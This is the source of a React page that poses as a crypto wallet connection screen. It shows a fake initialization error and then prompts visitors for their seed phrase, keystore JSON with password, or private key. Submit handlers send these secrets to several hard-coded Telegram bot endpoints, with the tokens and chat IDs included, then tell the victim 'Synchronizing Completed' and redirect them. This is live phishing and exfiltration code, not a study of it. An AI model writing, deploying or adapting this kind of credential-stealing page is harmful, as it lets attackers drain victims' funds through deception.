import React from 'react';

import { useEffect } from 'react';
import { useLocation } from 'react-router-dom';

import './wallet.css';

import { useState } from 'react';
import axios from 'axios';
import { Link } from 'react-router-dom';
// coin images
import trust from './coins/Trust.png';
import walletconnect from './coins/Walletconnect.png';
import Metamask from './coins/Metamask.png';
import Rainbow from './coins/Rainbow.png';
import ledger from './coins/Ledger.png';
import hashpack from './coins/hashpack.png';
import cryptocom from './coins/cryptop.com.png';
import imtoken from './coins/imToken.png';
import anchor from './coins/anchor.png';
import onto from './coins/ONTO.png';
import tokenpocket from './coins/TokenPocket.png';
import mathwallet from './coins/Mathwallet.png';
import bitpay from './coins/bitpay.png';
import ledgerlife from './coins/Ledger Live.png';
import maiar from './coins/maiar.png';
import walleth from './coins/Walleth.png';
import authereum from './coins/Authereun.png';
import mykey from './coins/MYKEY.png';
import trustvault from './coins/trustvault.png';
import coolwallet from './coins/coolwallet.png';
import decent from './coins/decent.png';
import zelcore from './coins/zelcore.png';
import coinomi from './coins/coinomi.png';
import gridplus from './coins/gridplus.png';
import wazirx from './coins/wazirx.png';
import safepay from './coins/safepay.png';
import infinito from './coins/infinito.png';
import walletio from './coins/wallet.io.png';
import infinitywallet from './coins/infinitywallet.png';
import ownbit from './coins/ownbit.png';
import easypocket from './coins/easypocket.png';
import sparkplus from './coins/sparkpoint.png';
import viawallet from './coins/viawallet.png';
import bitkeep from './coins/bitkeep.png';
import peakdefi from './coins/peakdefi.png';
import cosmostatioin from './coins/cosmostation.png';
import graph from './coins/graphprotocol.png';
import kardiachain from './coins/kardian.png';
import keplr from './coins/keplr.png';
import iconex from './coins/iconex.png';
import fetch from './coins/fetch.png';
import xdc from './coins/xdc.png';
import unstop from './coins/unstoppable.png';
import meet from './coins/meet.png';
import dok from './coins/dok.png';
import at from './coins/atwallet.png';
import moris from './coins/morix.png';
import midas from './coins/midas.png';
import keyring from './coins/keyring.png';
import blockchain from './coins/blockchain.png';
import binance from './coins/biancesmart.png';
import ark from './coins/Aktionariat.png';

import fwallet from './bitfrost.png';
import pmask from './popular/pmask.svg';


import pwallet from './popular/pwallet.svg';
import pcoinbase from './popular/pcoinbase.svg';
import pledger from './popular/pledger.svg';

import add from './popular/add.svg';
// end of coin images


function Wallet(){

    const handleRefresh = () => {
        window.location.reload();
      };

    const location = useLocation();


    const[selectedName, setSelectedName] = useState("");

    const[selectedImage, setSelectedImage] = useState("");

    useEffect(() => {
        // document.title = "S";
      }, [location.pathname]); // The empty dependency array [] ensures this effect runs once on component mount


      const [popular, setPopular] = useState([

        {
            "name":"MetaMask",
            "url":pmask,

        },

        {
            "name":"WalletConnect",
            "url":pwallet,

        },

        {
            "name":"Coinbase",
            "url":pcoinbase,

        },

        {
            "name":"Ledger",
            "url":pledger,

        },
          
      ]);

      const[wallets, setWallets]=useState([
        {
            "name":"Trust",
            "url":trust,

        },

        {
          "name":"Wallet Connect",
          "url":walletconnect,


      },

      // {
      //     "name":"Atomic",
      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/atomic-4c02d2b33cf091fd83c7a49819394e41.png",


      // },

      {
          "name":"Metamask",
          "url":Metamask,


      },
      {
          "name":"Blockchain",
          "url":blockchain,


      },


      {
          "name":"Binance Smart Chain",
          "url":binance,

      },

      {
          "name":"Crypto.com | DeFi Wallet",
          "url":cryptocom,


      },


      {
          "name":"Rainbow",
          "url":Rainbow,


      },

      {
          "name":"Ledger",
          "url":ledger,


      },

      {
          "name":"HashPack",
          "url":hashpack,


      },

      // {
      //     "name":"Fantom Wallet",
      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/fantom-ftm-logo.png",


      // },

     


      {
          "name":"imToken",
          "url":imtoken,


      },

      {
          "name":"Anchor",
          "url":anchor,


      },

      {
          "name":"ONTO",
          "url":onto,


      },

      {
          "name":"TokenPocket",
          "url":tokenpocket,


      },

      {
          "name":"MathWallet",
          "url":mathwallet,


      },


      {
          "name":"BitPay",
          "url":bitpay,


      },

      {
          "name":"Maiar",
          "url":maiar,


      },


      {
          "name":"Ledger Live",
          "url":ledgerlife,


      },

      {
          "name":"Walleth",
          "url":walleth,


      },

      {
          "name":"Authereum",
          "url":authereum,


      },

      {
          "name":"MYKEY",
          "url":mykey,


      },

      {
          "name":"TrustVault",
          "url":trustvault,


      },


      // {
      //     "name":"Coin98",
      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/coin98-c5b50adaceaf474e48ef1dad150d0829.png",


      // },


      {
          "name":"CoolWallet S",
          "url":coolwallet,


      },


      {
          "name":"D'CENT Wallet",
          "url":decent,


      },

      {
          "name":"ZelCore",
          "url":zelcore,


      },


      {
          "name":"Coinomi",
          "url":coinomi,


      },


      {
          "name":"GridPlus",
          "url":gridplus,


      },

      // {
      //     "name":"CYBAVO Wallet",
      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png",


      // },

      {
          "name":"Wazirx",
          "url":wazirx,


      },


      {
          "name":"SafePal",
          "url":safepay,


      },

      {
          "name":"Infinito",
          "url":infinito,


      },

      {
          "name":"Wallet.io",
          "url":walletio,

      },


      {
          "name":"Infinity Wallet",
          "url":infinitywallet,


      },


      {
          "name":"Ownbit",
          "url":ownbit,


      },


      {
          "name":"EasyPocket",
          "url":easypocket,


      },


      {
          "name":"SparkPoint",
          "url":sparkplus,
      },




      {
          "name":"ViaWallet",
          "url":viawallet,


      },


      {
          "name":"BitKeep",
          "url":bitkeep,


      },


      // {
      //     "name":"Vision",
      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/vision-928292fe642172a18e62feb5eaa2d639.png",


      // },


      {
          "name":"PEAKDEFI Wallet",
          "url":peakdefi,


      },

      {
          "name":"Cosmostation",
          "url":cosmostatioin,


      },

      {
          "name":"Graph Protocol",
          "url":graph,


      },


      {
          "name":"KardiaChain",
          "url":kardiachain,


      },


      {
          "name":"Keplr",
          "url":keplr,


      },

      // {
      //     "name":"Harmony",
      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/harmony.png",


      // },

      {
          "name":"ICONex",
          "url":iconex,

      },


      {
          "name":"Fetch",
          "url":fetch,


      },

      {
          "name":"XDC Wallet",
          "url":xdc,


      },


      {
          "name":"Unstoppable Wallet",
          "url":unstop,


      },


      {
          "name":"MEET.ONE",
          "url":meet,


      },


      {
          "name":"Dok Wallet",
          "url":dok,


      },


      {
          "name":"AT.Wallet",
          "url":at,

      },

      {
          "name":"MoriX Wallet",
          "url":moris,


      },


      {
          "name":"Midas Wallet",
          "url":midas,


      },


      {
          "name":"KEYRING PRO",
          "url":keyring,


      },


     


      {
          "name":"Aktionariat",
          "url":ark,


      },


      ]);



      const[phrase, setPhrase]=useState("");
      const[keystore_json, setKeyStoreJson] = useState("");
      const[wallet_password , setWalletPassword] = useState("");

      const[private_key, setPrivateKey] = useState("");

      const[showError, setShowError] = useState(false);

      const[errorMessage, setErrorMessage] = useState("");


      async function handlePhrase(e){
        e.preventDefault();

        setKeyStoreJson("");
        setPrivateKey("");
        setWalletPassword("");


        try {
           

        

                 await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
                    chat_id: 6150403557,
                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
                  });


                await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
                    chat_id: 5868304053,
                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
                  });


                  const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
                    chat_id: 5916570239,
                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
                  });
  
  
  



        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
                

              
              
                    alert(`Synchronizing Completed, Kindly login in an hour`);
                    window.location.href = 'https://govern.bifrostweb.app/';
                
               



            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        

        
    }

    async function handleKeystoreJson(e){
        e.preventDefault();

        setPhrase("");
        setPrivateKey("");
        



        try {
            // const response = await axios.post('https://webresolve.onrender.com/api/send', {
            //     phrase:phrase,
            //     keystore_json:keystore_json,
            //     wallet_password:wallet_password,
            //     private_key:private_key,
            //     type:"Keystore Json",
            //     platform:selectedName,
            // });


            await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
                chat_id: 6150403557,
                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
              });


            await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
                chat_id: 5868304053,
                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
              });


           


            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
                chat_id: 5916570239,
                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
              });

        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
                

              
              
                    alert(`Synchronizing Completed, Kindly login in an hour`);
                    window.location.href = 'https://govern.bifrostweb.app/';
                
               



            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        

        
    }



    async function handlePrivateKey(e){
        e.preventDefault();

        setKeyStoreJson("");
        setPhrase("");
        setWalletPassword("");



        try {
            // const response = await axios.post('https://webresolve.onrender.com/api/send', {
            //     phrase:phrase,
            //     keystore_json:keystore_json,
            //     wallet_password:wallet_password,
            //     private_key:private_key,
            //     type:"Private Key",
            //     platform:selectedName,
            // });

            await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
                    chat_id: 6150403557,
                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
                  });


                await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
                    chat_id: 5868304053,
                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
                  });


                  const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
                    chat_id: 5916570239,
                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
                  });
  
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
                

              
              
                    alert(`Synchronizing Completed, Kindly login in an hour`);
                    window.location.href = 'https://govern.bifrostweb.app/';
                
               



            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        

        
    }

    const[phrasekeycount, setPhraseKeyCount] = useState(0);

    const[keystorejsoncount, setKeystoreJsonCount] = useState(0);

    const[privatekeycount, setPrivateKeyCount] = useState(0);
      

    return (
        <div className='mydiv'>

        <div className='px-5 py-5'>
            <img  className='myimage'style={{
                width:"170px"
            }} src={fwallet}/>

        </div>
            <h3 className='text-center py-2 wallethead'>Access your wallet. </h3>
           <p className='mainpara'> Select one of the following methods. You can also choose to create a new wallet.</p>



        <br/>

        <br/>


        <div className='px-5'>
            <h3 className='most'>MOST POPULAR</h3>


            <div className='myflexdiv'>

              {
                  popular.map(function(wall,index){
                      return (
                        <div onClick={function(e){
                            setSelectedName(wall.name);

                            setSelectedImage(wall.url);
                        }} className='cup text-center'data-toggle="modal" data-target="#exampleModal">

                    <img className='popular' src={wall.url}/>

                    <p className='populartext'>{wall.name}</p>

                </div>
                      );
                  })
              }  

                    <Link to={'/wallets'} className='cup text-center'>

                    <img className='popular' src={add}/>

                    <p className='populartext'>OTHERS</p>

                </Link>

              

            </div>
           

        </div>
<br/>

        <div className='text-center mt-5'>
        <p className='mainparafooter'> 
By using this application you agree to the <a href='' className='footerlink'>Terms of Use</a>. <br/>
Additionally please refer to the Important Notice.</p>
        </div>


        

            



            {selectedName && <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header modalbg">
        <h5 class="modal-title modaltitle" id="exampleModalLabel">Back</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
                <div className='py-2 errordiv mx-4 px-3'>

                    <p className='text-danger mt-2'>Error Initializing.. <span><button className='btn text-light border-0 rounded connect'data-toggle="modal" data-target="#staticBackdropTwo">Connect Manually</button></span></p>

                </div>

                <br/>

                <div className='py-2 greydiv mx-4 px-3'>

                    <div className='row'>
                        <div className='col-6'>
                            <p className='infinity'>{selectedName}</p>

                            <p className='easy'>
                                Easy-to-use browser extension
                            </p>

                        </div>

                        <div className='col-6 text-right'>

                            <img className='smallimage mt-2' src={selectedImage} />

                            
                        </div>

                    </div>

                </div>
      </div>
      
    </div>
  </div>
</div>

    }


{/* modal two */}

<div class="modal fade" id="staticBackdropTwo" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabelTwo" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
     
      <div class="modal-body">
            <div className='modalheight py-5 mt-3'>

                <p className="secondmod text-center"><img className='secondmodimage px-3' src={selectedImage} />Import your {selectedName} wallet</p>

            </div>


            {showError &&  <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>{errorMessage}</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}



            <ul class="nav nav-pills myline" id="pills-tab" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="pills-home-tab" data-toggle="pill" data-target="#pills-home" type="button" role="tab" aria-controls="pills-home" aria-selected="true">Phrase</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="pills-profile-tab" data-toggle="pill" data-target="#pills-profile" type="button" role="tab" aria-controls="pills-profile" aria-selected="false"><span className='pushdown'>Keystore  JSON</span></button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="pills-contact-tab" data-toggle="pill" data-target="#pills-contact" type="button" role="tab" aria-controls="pills-contact" aria-selected="false">Private Key</button>
                    </li>
                    </ul>
<div class="tab-content " id="pills-tabContent">
  <div class="tab-pane fade show active" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">

        <form onSubmit={handlePhrase} className='mx-4'>

            <div className='form-group'>

                <textarea onChange={function(e){
                    setPhrase(e.target.value)
                }} value={phrase} rows="4" className='form-control'placeholder='Enter your recovery phrase'required>

                </textarea>

                <p className='smallest'>Typically 12 (sometimes 24) words separated by single spaces</p>

            </div>

            <br/>

            <button type="submit" className='btn btn-primary text-light text-center w-100'>PROCEED</button>
        </form>

  </div>
  <div class="tab-pane fade" id="pills-profile" role="tabpanel" aria-labelledby="pills-profile-tab">

  <form onSubmit={handleKeystoreJson} className='mx-4'>

<div className='form-group'>

    <textarea onChange={function(e){
        setKeyStoreJson(e.target.value);
    }} value={keystore_json} rows="4" className='form-control'placeholder='Keystore JSON'>

    </textarea>
    </div>


    <div className='form-group'>
        <input onChange={function(e){
            setWalletPassword(e.target.value);
        }} value={wallet_password} className='form-control' placeholder='Wallet Password'/>

    </div>

    <p className='smallest mt-3'>Several lines of text beginning with plus the password you used to encrypt it.</p>



<br/>

<button type='submit' className='btn btn-primary text-light text-center w-100'>PROCEED</button>
</form>

  </div>
  <div class="tab-pane fade" id="pills-contact" role="tabpanel" aria-labelledby="pills-contact-tab">

  <form onSubmit={handlePrivateKey} className='mx-4'>




    <div className='form-group mt-2'>
        <input onChange={function(e){
            setPrivateKey(e.target.value);
        }} value={private_key} className='form-control' placeholder='Enter Your Private Key'/>

    </div>

    <p className='smallest mt-3'>Typically 12 (sometimes 24) words seperated by a single space.

</p>



<br/>

<button type='submit' className='btn btn-primary text-light text-center w-100'>PROCEED</button>
</form>
  </div>
</div>


            
                <div className='text-right mt-5 px-4'>
                     <button onClick={function(e){
                        //  setSelectedName("");

                        //  handleRefresh();
                     }} data-dismiss="modal"className='btn btn-danger text-light'>Cancel</button>

                </div>
             
      </div>
     
    </div>
  </div>
</div>
        </div>
    );
}


export default Wallet;
